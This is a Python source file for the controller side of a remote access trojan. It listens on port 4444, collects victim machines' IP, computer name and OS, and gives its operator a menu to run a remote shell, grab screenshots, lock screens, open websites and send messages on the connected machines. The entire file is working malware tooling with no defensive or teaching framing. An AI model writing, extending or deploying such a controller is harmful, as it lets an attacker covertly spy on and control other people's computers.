#!/usr/bin/env python3
import socket
import os
import time
import threading
import sys
from queue import Queue

threads = 2
jobs = [1, 2]
q = Queue()

addrs = []
conns = []

host = "192.168.0.11"
port = 4444
buff = 1024

decode_utf = lambda data: data.decode("utf-8")

remove_quotes = lambda string: string.replace('"', "")

center = lambda string, title: f"{{:^{len(string)}}}".format(title)

send = lambda data: conn.send(data)

recv = lambda buffer: conn.recv(buffer)


def recv_all(buffer):
    byte_data = b""
    while True:
        byte_part = recv(buffer)

        if len(byte_part) == buffer:
            return byte_part

        byte_data += byte_part

        if len(byte_data) == buffer:
            return byte_data


def create_socket():
    global sock
    try:
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error() as e:
        print(str(e))


def sock_bind():
    global sock
    try:
        print("Listening on port: " + str(port))
        sock.bind((host, port))
        sock.listen(20)
    except socket.error:
        print(str(socket.error))
        sock_bind()


def sock_accept():
    while True:
        try:
            conn, addr = sock.accept()
            conn.setblocking(1)  # no timeout
            conns.append(conn)

            client_info = decode_utf(conn.recv(buff)).split("',")

            addr += client_info[0], client_info[1], client_info[2]
            addrs.append(addr)

            print("\nconnection established : {0} ({1})".format(addr[0], addr[2]))

        except socket.error:

            print(str(socket.error))
            continue


def close():
    global conns, addrs

    if len(addrs) == 0:
        return

    for counter, conn in enumerate(conns):
        conn.send(str.encode("exit"))
        conn.close()

    del conns
    conns = []
    del addrs
    addrs = []


def list_conn():
    if len(conns) > 0:
        clients = ""
        for counter, conn in enumerate(conns):
            clients += (
                str(counter)
                + 4 * " "
                + str(addrs[counter][0])
                + 4 * "  "
                + str(addrs[counter][1])
                + 4 * "  "
                + str(addrs[counter][2])
                + 4 * "  "
                + str(addrs[counter][3])
                + "\n"
            )

        print(
            "\nID"
            + 3 * " "
            + center(str(addrs[0][0]), "ip")
            + 4 * "  "
            + center(str(addrs[0][1]), "port")
            + 4 * "  "
            + center(str(addrs[0][2]), "pc name")
            + 4 * "  "
            + center(str(addrs[0][3]), "os")
            + "\n"
            + clients,
            end="",
        )

    else:
        print("no connections.")


def menu_help():
    print("\n--help")
    print("--l list connections")


def main_menu():
    while True:
        choice = input("\n>> ")

        if choice == "--l":
            list_conn()

        elif choice[:3] == "--i" and len(choice) > 3:
            conn = select_conn(choice[4:], "True")
            if conn is not None:
                send_cmd()

        elif choice == "--x":
            close()
            break

        else:
            print("invalid choice")
            menu_help()


def select_conn(conn_id, want_response):
    global conn, info
    try:
        conn_id = int(conn_id)
        conn = conns[conn_id]
    except:
        print("invalid choice")
        return
    else:
        info = (
            str(addrs[conn_id][0]),
            str(addrs[conn_id][2]),
            str(addrs[conn_id][3]),
            str(addrs[conn_id][4]),
        )
        if want_response == "True":
            print("connected to " + info[0] + " . . .\n")
        return conn


def send_cmd():
    while True:
        choice = input("\ntype selection: ")

        if choice[:3] == "--m" and len(choice) > 3:
            msg = "msg:" + choice[4:]
            send(msg.encode())

        elif choice[:3] == "--o" and len(choice) > 3:
            site = "site" + choice[4:]
            send(site.encode())

        elif choice == "--s":
            screenshot()

        elif choice == "--x 1":
            send("lock".encode())

        elif choice == "--e":
            shell()

        elif choice[:3] == "--x":
            break


def shell():
    send("cmd".encode())
    default = "\n" + decode_utf(recv(buff)) + ">"

    print(default, end="")

    while True:
        cmd = input()

        if cmd == "quit" or cmd == "exit":
            send("goback".encode())

        elif cmd == "cmd":
            print("not valid cmd")

        elif len(str(cmd)) > 0:
            send(cmd.encode())
            buffer = int(decode_utf(recv(buff)))
            response = decode_utf(recv_all(buffer))
            print(response, end="")  # print cmd out

        else:
            print(default, end="")


def screenshot():
    send("screen".encode())
    response = decode_utf(recv(buff))
    print("\n" + response)
    buffer = ""
    for counter in range(0, len(response)):
        if response[counter].isdigit():
            buffer += response[counter]

    buffer = int(buffer)

    file_name = time.strftime("%Y-%m-%d-%H_%M_%S" + ".png")
    img_data = recv_all(buffer)
    img = open(file_name, "wb")
    img.write(img_data)
    img.close()
    print(
        "screenshot downloaded\nreceived " + str(os.path.getsize(file_name)) + " bytes"
    )


def create_threads():
    for _ in range(threads):
        work_thread = threading.Thread(target=work)
        work_thread.daemon = True
        work_thread.start()
    q.join()


def work():
    while True:
        val = q.get()
        if val == 1:
            create_socket()
            sock_bind()
            sock_accept()

        elif val == 2:
            while True:
                time.sleep(0.2)
                if len(addrs) > 0:
                    main_menu()
                    break

        q.task_done()
        q.task_done()
        sys.exit(0)


def create_jobs():
    for threads in jobs:
        q.put(threads)
    q.join()


create_threads()
create_jobs()